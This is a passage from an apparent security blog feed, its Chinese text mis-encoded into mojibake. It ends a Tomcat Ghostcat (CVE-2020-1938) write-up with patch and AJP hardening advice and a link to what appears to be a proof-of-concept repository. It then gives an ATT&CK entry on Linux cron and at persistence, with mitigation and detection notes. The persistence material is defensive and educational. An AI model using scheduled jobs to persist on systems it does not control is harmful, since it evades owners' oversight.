å›ºä¿®å¤"><a href="#åŠ å›ºä¿®å¤" class="headerlink" title="åŠ å›ºä¿®å¤"></a>åŠ å›ºä¿®å¤</h3><ol><li>Apacheå®˜æ–¹å·²å‘å¸ƒ9.0.31ã€8.5.51åŠ7.0.100ç‰ˆæœ¬é’ˆå¯¹æ­¤æ¼æ´è¿›è¡Œä¿®å¤ï¼ŒApache Tomcat 6 å·²ç»åœæ­¢ç»´æŠ¤ï¼Œè¯·å‡çº§åˆ°æœ€æ–°å—æ”¯æŒçš„ Tomcat ç‰ˆæœ¬ä»¥å…é­å—æ¼æ´å½±å“ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://tomcat.apache.org/download-70.cgi </span><br><span class="line">https://tomcat.apache.org/download-80.cgi</span><br><span class="line">https://tomcat.apache.org/download-90.cgi</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨AJPåè®®çš„ä¸´æ—¶å¤„ç½®æ–¹æ³•ï¼šä¸ºAJP Connectoré…ç½®secretæ¥è®¾ç½® AJP åè®®çš„è®¤è¯å‡­è¯ï¼Œä¸”æ³¨æ„å£ä»¤å¼ºåº¦</li><li>æœªä½¿ç”¨AJPåè®®çš„ä¸´æ—¶å¤„ç½®æ–¹æ³•ï¼šç¦ç”¨AJPåè®®ç«¯å£ï¼Œåœ¨conf/server.xmlé…ç½®æ–‡ä»¶ä¸­æ³¨é‡Šï¼Œå¹¶é‡å¯TomcatæœåŠ¡</li></ol><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/8Wueh4lkKBtfNisjxOSoWAhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat-CVE-2020-1938å¤ç°&quot;&gt;&lt;a href=&quot;#Tomcat-CVE-2020-1938å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;Tomcat-CVE-2020-1938å¤ç°&quot;&gt;&lt;/a&gt;Tomcat-CVE-2020-1938</summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>è®¡åˆ’ä»»åŠ¡</title>
    <link href="http://example.com/2020/01/26/ATT&amp;CK-%E6%8C%81%E4%B9%85%E5%8C%96-Local%20Job%20Scheduling/"/>
    <id>http://example.com/2020/01/26/ATT&amp;CK-%E6%8C%81%E4%B9%85%E5%8C%96-Local%20Job%20Scheduling/</id>
    <published>2020-01-26T12:32:11.000Z</published>
    <updated>2021-09-28T08:54:45.749Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK-æŒä¹…åŒ–-Local-Job-Scheduling"><a href="#ATT-amp-CK-æŒä¹…åŒ–-Local-Job-Scheduling" class="headerlink" title="ATT&amp;CK-æŒä¹…åŒ–-Local Job Scheduling"></a>ATT&amp;CK-æŒä¹…åŒ–-Local Job Scheduling</h1><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>åœ¨Linuxç³»ç»Ÿä¸Šï¼Œæ”¯æŒå¤šç§æ–¹æ³•æ¥åˆ›å»ºé¢„å®šçš„å’Œå®šæœŸçš„åå°ä½œä¸šï¼šcronï¼Œatï¼Œä¸Windowsç³»ç»Ÿä¸Šçš„â€œè®¡åˆ’ä»»åŠ¡â€ä¸åŒï¼ŒåŸºäºLinuxçš„ç³»ç»Ÿä¸Šçš„ä½œä¸šè®¡åˆ’æ— æ³•è¿œç¨‹å®Œæˆï¼Œé™¤éåœ¨å·²å»ºç«‹çš„è¿œç¨‹ä¼šè¯ï¼ˆå¦‚å®‰å…¨å¤–å£³ï¼ˆSSHï¼‰ï¼‰ä¸­ç»“åˆä½¿ç”¨</p><h3 id="æµ‹è¯•ç”¨ä¾‹"><a href="#æµ‹è¯•ç”¨ä¾‹" class="headerlink" title="æµ‹è¯•ç”¨ä¾‹"></a>æµ‹è¯•ç”¨ä¾‹</h3><h4 id="cron"><a href="#cron" class="headerlink" title="cron"></a>cron</h4><p>cronæ˜¯å¤§å¤šæ•°linuxå‘è¡Œç‰ˆéƒ½è‡ªå¸¦çš„å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰ï¼Œç”¨æ¥é‡å¤è¿è¡ŒæŸäº›è¢«è®¾å®šå¥½äº†ç¡®å®šçš„è¿è¡Œæ—¶é—´çš„ä»»åŠ¡ï¼Œç³»ç»Ÿé»˜è®¤crontabæ–‡ä»¶ä¸º/etc/crontab,ä»¥åŠ/etc/cron.d/ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œcronå®ˆæŠ¤è¿›ç¨‹ä¼šæ£€æŸ¥/etc/crontabä»¥åŠ/etc/cron.d/ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ ¹æ®è¿™äº›æ–‡ä»¶ä¸­çš„cronä»»åŠ¡æ‰€è®¾ç½®çš„æ‰§è¡Œæ—¶é—´å†³å®šæ˜¯å¦æ‰§è¡Œä»»åŠ¡ï¼Œå¦‚æœå½“å‰æ—¶é—´ä¸cronä»»åŠ¡æ‰€è®¾ç½®çš„æ‰§è¡Œæ—¶é—´ç›¸åŒï¼Œåˆ™æ‰§è¡Œä»»åŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç¬¬1åˆ—åˆ†é’Ÿ0ï½59</span><br><span class="line">ç¬¬2åˆ—å°æ—¶0ï½23ï¼ˆ0è¡¨ç¤ºå­å¤œï¼‰</span><br><span class="line">ç¬¬3åˆ—æ—¥1ï½31</span><br><span class="line">ç¬¬4åˆ—æœˆ1ï½12</span><br><span class="line">ç¬¬5åˆ—æ˜ŸæœŸ0ï½7ï¼ˆ0å’Œ7è¡¨ç¤ºæ˜ŸæœŸå¤©ï¼‰</span><br><span class="line">ç¬¬6åˆ—è¦è¿è¡Œçš„å‘½ä»¤</span><br></pre></td></tr></table></figure><p>crontab -e ç¼–è¾‘ä¸€æ¡ä»»åŠ¡<br>æ¯å¤©æ™šä¸Š9ç‚¹30åˆ†æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">30 21 * * * command</span><br></pre></td></tr></table></figure><p>crontab -låˆ—å‡ºä»»åŠ¡åˆ—è¡¨<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/4PoIwU.png" alt="4PoIwU"><br>crontab -r åˆ é™¤å½“å‰ç”¨æˆ·çš„ä»»åŠ¡</p><p>/etc/cron.d/ ç›®å½•ä¸‹åˆ›å»ºå®šæ—¶ä»»åŠ¡<br>åˆ›å»ºtestæ–‡ä»¶ï¼Œå†…å®¹ä¸ºå®šæ—¶ä»»åŠ¡ï¼Œè¿™ç§æ–¹å¼åˆ›å»ºçš„å®šæ—¶ä»»åŠ¡ä½¿ç”¨crontab -lå‘½ä»¤æ˜¯æŸ¥çœ‹ä¸äº†çš„<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/kKKQoq.png" alt="kKKQoq"></p><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><p>atå‘½ä»¤ç”¨äºåœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œå‘½ä»¤ã€‚atå…è®¸ä½¿ç”¨ä¸€å¥—ç›¸å½“å¤æ‚çš„æŒ‡å®šæ—¶é—´çš„æ–¹æ³•ã€‚å®ƒèƒ½å¤Ÿæ¥å—åœ¨å½“å¤©çš„hh:mmï¼ˆå°æ—¶:åˆ†é’Ÿï¼‰å¼çš„æ—¶é—´æŒ‡å®šã€‚<br>å‘½ä»¤å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">èƒ½å¤Ÿæ¥å—æ ‡å‡†å°æ—¶æ—¶é—´ï¼Œhh:mmï¼ˆå°æ—¶:åˆ†é’Ÿï¼‰å¼çš„æ—¶é—´æŒ‡å®šã€‚ä¾‹å¦‚ï¼Œ13:12ã€‚</span><br><span class="line">ç‰¹å®šå¯å‘½åæ—¶é—´ï¼Œä¾‹å¦‚nowï¼Œnoonï¼Œteatimeï¼ˆä¸€èˆ¬æ˜¯ä¸‹åˆ4ç‚¹ï¼‰ç­‰æ¯”è¾ƒæ¨¡ç³Šçš„è¯è¯­æ¥æŒ‡å®šæ—¶é—´ã€‚</span><br><span class="line">AM/PMæŒ‡ç¤ºç¬¦ï¼Œé‡‡ç”¨12å°æ—¶è®¡æ—¶åˆ¶ï¼Œä¾‹å¦‚ 10:10 AMã€‚</span><br><span class="line">æ ‡å‡†æ—¥æœŸæ ¼å¼ï¼ŒMMDDYYï¼ŒMM/DD/YYç­‰ï¼Œä¾‹å¦‚12/31/16ã€‚</span><br><span class="line">æ—¶é—´å¢é‡ï¼Œä¾‹å¦‚now+25 minï¼Œ10:17+7å¤©ã€‚</span><br><span class="line">å¯ä»¥ä½¿ç”¨todayã€tomorrowæ¥æŒ‡å®šæ—¶é—´ã€‚</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œshellæ–‡ä»¶<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/lYPka8.png" alt="lYPka8"><br>æ‰§è¡Œå‘½ä»¤<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/VPp6ot.png" alt="VPp6ot"><br>atqæŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/4iVmgf.png" alt="4iVmgf"><br>åˆ é™¤ä»»åŠ¡ä½¿ç”¨atrm ä»»åŠ¡åºå·</p><h3 id="ç¼“è§£æªæ–½"><a href="#ç¼“è§£æªæ–½" class="headerlink" title="ç¼“è§£æªæ–½"></a>ç¼“è§£æªæ–½</h3><p>é™åˆ¶ç”¨æˆ·å¸æˆ·çš„ç‰¹æƒï¼Œä»¥ä¾¿åªæœ‰æˆæƒç”¨æˆ·æ‰èƒ½åˆ›å»ºè®¡åˆ’çš„ä½œä¸šã€‚</p><h3 id="ä¾¦æµ‹"><a href="#ä¾¦æµ‹" class="headerlink" title="ä¾¦æµ‹"></a>ä¾¦æµ‹</h3><p>ç›‘è§†å¯åŠ¨ä»»åŠ¡å’Œcronä»»åŠ¡å¯¼è‡´çš„æµç¨‹æ‰§è¡Œï¼Œä»¥æŸ¥æ‰¾å¼‚å¸¸æˆ–æœªçŸ¥çš„åº”ç”¨ç¨‹åºå’Œè¡Œä¸ºã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK-æŒä¹…åŒ–-Local-Job-Scheduling&quot;&gt;&lt;a href=&quot;#ATT-amp-CK-æŒä¹…åŒ–-Local-Job-Scheduling&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK-æŒä¹…åŒ–-Local J</summary>
      
    
    
    
    <category term="ATT&amp;CK" scheme="http://example.com/categories/ATT-CK/"/>
    
    
    <category term="ATT&amp;CK" scheme="http://example.com/tags/ATT-CK/"/>
    
  </entry>
  
</feed>
